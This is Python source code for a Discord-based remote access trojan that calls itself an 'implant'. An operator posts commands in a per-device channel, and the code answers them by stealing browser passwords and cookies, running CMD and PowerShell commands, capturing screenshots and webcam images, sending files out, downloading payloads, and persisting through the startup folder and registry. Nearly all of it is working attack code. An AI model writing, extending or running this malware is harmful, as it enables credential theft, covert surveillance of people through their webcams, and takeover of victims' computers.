import discord
import os
import socket
import asyncio
import shlex
import base64
from discord import File, Embed

# Import all execution modules
import command_executor as cmd
import notification_sender as notifier
import screenshot_taker as ss
import system_info as sysinfo
import web_opener
import startup_manager
import webcam_manager as wcm
import file_explorer as fe
import persistence_manager as pm
import file_transfer_manager as ftm
import stealer  # NEW module for password/cookie stealing

# --- Configuration ---
TOKEN_PATH = 'token.txt'
SERVER_CATEGORY_NAME = "🔴 Live Sessions"
INSTRUCTION_PREFIX = 'EXEC_CMD:'
EMBED_COLOR = 0x2B2D31
DISCORD_FILE_LIMIT = 25 * 1024 * 1024  # 25 MB

# --- Bot Setup & Helpers ---
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

def load_token():
    if not os.path.exists(TOKEN_PATH):
        raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f:
        return f.read().strip()

def get_device_name():
    hostname = socket.gethostname()
    return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

# --- Core Events ---
@client.event
async def on_ready():
    print(f'Implant logged in as {client.user} on device {get_device_name()}')
    if not client.guilds:
        return
    
    guild = client.guilds[0]
    device_name = get_device_name()
    
    category = discord.utils.get(guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        try:
            category = await guild.create_category(SERVER_CATEGORY_NAME)
        except discord.Forbidden:
            return
    
    channel = discord.utils.get(guild.text_channels, name=device_name, category=category)
    if not channel:
        try:
            channel = await guild.create_text_channel(device_name, category=category)
        except discord.Forbidden:
            return
    
    try:
        embed = Embed(
            title="🟢 New Session Started",
            description=f"Device **{device_name}** is now online and ready for commands.",
            color=discord.Color.green()
        )
        await channel.send(embed=embed)
    except discord.Forbidden:
        pass

@client.event
async def on_message(message):
    device_name = get_device_name()
    if message.channel.name != device_name or not message.content.startswith(INSTRUCTION_PREFIX):
        return

    content = message.content[len(INSTRUCTION_PREFIX):]
    parts = content.split(' ', 1)
    command_name = parts[0]
    args_str = parts[1] if len(parts) > 1 else ""

    try:
        # --- File Transfer Handlers ---
        if command_name == "download":
            file_path = args_str
            if not os.path.exists(file_path) or not os.path.isfile(file_path):
                raise FileNotFoundError(f"File not found on implant: {file_path}")
            
            file_size = os.path.getsize(file_path)
            if file_size > DISCORD_FILE_LIMIT:
                raise Exception(f"File size ({file_size / 10_000_000:.2f} MB) exceeds Discord's limit of {DISCORD_FILE_LIMIT / 10_000_000} MB.")
            
            embed = Embed(
                title=f"📦 Downloading File: `{os.path.basename(file_path)}`",
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed, file=File(file_path))

        elif command_name == "upload_url":
            save_path, url = shlex.split(args_str)
            status = await asyncio.to_thread(ftm.download_from_url, url, save_path)
            embed = Embed(
                title="📥 Upload from URL Status",
                description=status,
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed)

        elif command_name == "upload_b64":
            save_path, encoded_data = args_str.split(' ', 1)
            file_bytes = base64.b64decode(encoded_data)
            with open(save_path, 'wb') as f:
                f.write(file_bytes)
            embed = Embed(
                title="📥 Upload from Attachment Status",
                description=f"✅ Successfully wrote attached file to `{save_path}`",
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed)
            
        # --- Password/Cookie Stealing ---
        elif command_name == "stealpasswords":
            data = await asyncio.to_thread(stealer.steal_passwords)
            if not data["passwords"]:
                raise Exception("No passwords found")
            
            formatted = stealer.format_results(data["passwords"], "passwords")
            temp_file = "passwords.txt"
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(formatted)
            
            embed = Embed(title="🔑 Retrieved Passwords", color=EMBED_COLOR)
            await message.channel.send(embed=embed, file=File(temp_file))
            os.remove(temp_file)

        elif command_name == "stealcookies":
            data = await asyncio.to_thread(stealer.steal_passwords)
            if not data["cookies"]:
                raise Exception("No cookies found")
            
            formatted = stealer.format_results(data["cookies"], "cookies")
            temp_file = "cookies.txt"
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(formatted)
            
            embed = Embed(title="🍪 Retrieved Cookies", color=EMBED_COLOR)
            await message.channel.send(embed=embed, file=File(temp_file))
            os.remove(temp_file)

        # --- Other Commands ---
        elif command_name == "kill":
            embed = Embed(
                title="🔴 Session Terminated",
                description=f"Device **{device_name}** has been shut down via remote command.",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            await client.close()

        elif command_name == "runcmd":
            output = cmd.execute_command(args_str)
            embed = Embed(
                title="📟 CMD Output",
                description=f"```cmd\n{output[:1980]}\n```",
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed)

        elif command_name == "runpw":
            output = cmd.execute_powershell(args_str)
            embed = Embed(
                title=" PowerShell Output",
                description=f"```powershell\n{output[:1980]}\n```",
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed)

        elif command_name == "takescreenshot":
            ss_file = ss.take_screenshot()
            if ss_file and os.path.exists(ss_file):
                embed = Embed(title="📸 Screenshot Captured", color=EMBED_COLOR)
                f = File(ss_file, filename="screenshot.png")
                embed.set_image(url="attachment://screenshot.png")
                await message.channel.send(file=f, embed=embed)
                os.remove(ss_file)
            else:
                raise Exception("Failed to create screenshot file.")

        elif command_name == "irlpicture":
            img_path = await asyncio.to_thread(wcm.capture_webcam_image)
            if img_path and os.path.exists(img_path):
                embed = Embed(title="📷 Webcam Image Captured", color=EMBED_COLOR)
                f = File(img_path, filename="webcam.png")
                embed.set_image(url="attachment://webcam.png")
                await message.channel.send(file=f, embed=embed)
                os.remove(img_path)
            else:
                raise Exception("Failed to capture webcam image.")

        elif command_name == "systemspecs":
            specs = sysinfo.get_specs()
            embed = Embed(
                title=f"💻 System Specs for {device_name}",
                color=discord.Color.blue()
            )
            embed.add_field(
                name="Operating System",
                value=f"{specs.get('platform','N/A')} {specs.get('platform_release','N/A')}",
                inline=False
            )
            embed.add_field(
                name="CPU",
                value=f"{specs.get('cpu_name','N/A')}",
                inline=False
            )
            embed.add_field(
                name="RAM Usage",
                value=f"{specs.get('ram_usage_percent','N/A')}% ({specs.get('ram_available','N/A')} of {specs.get('ram_total','N/A')})",
                inline=False
            )
            await message.channel.send(embed=embed)

        elif command_name == "shownotification":
            t, m = shlex.split(args_str)
            s = notifier.show(t, m)
            msg = "Successfully displayed notification." if s else "Failed to display notification."
            embed = Embed(
                title="🖥️ Notification Status",
                description=msg,
                color=discord.Color.green() if s else discord.Color.orange()
            )
            await message.channel.send(embed=embed)

        elif command_name == "openwebsite":
            s = web_opener.open_url(args_str)
            msg = f"Successfully attempted to open `{args_str}`." if s else f"Failed to open `{args_str}`."
            embed = Embed(
                title="🌐 Open URL Status",
                description=msg,
                color=discord.Color.green() if s else discord.Color.orange()
            )
            await message.channel.send(embed=embed)

        elif command_name == "putinstartup":
            status = startup_manager.add_to_startup()
            embed = Embed(
                title="⚙️ Startup Folder Status",
                description=f"`{status}`",
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed)

        elif command_name == "persist":
            status = pm.add_to_registry(args_str)
            embed = Embed(
                title="⚙️ Registry Persistence Status",
                description=f"`{status}`",
                color=EMBED_COLOR
            )
            await message.channel.send(embed=embed)

        elif command_name == "explore":
            embed = fe.create_explorer_embed(args_str)
            await message.channel.send(embed=embed)

    except Exception as e:
        embed = Embed(
            title="❌ Implant Error",
            description=f"An error occurred on `{device_name}`:\n```py\n{e}\n```",
            color=discord.Color.red()
        )
        await message.channel.send(embed=embed)

# --- Main Execution ---
if __name__ == "__main__":
    try:
        client.run(load_token())
    except Exception as e:
        print(f"Failed to start implant: {e}")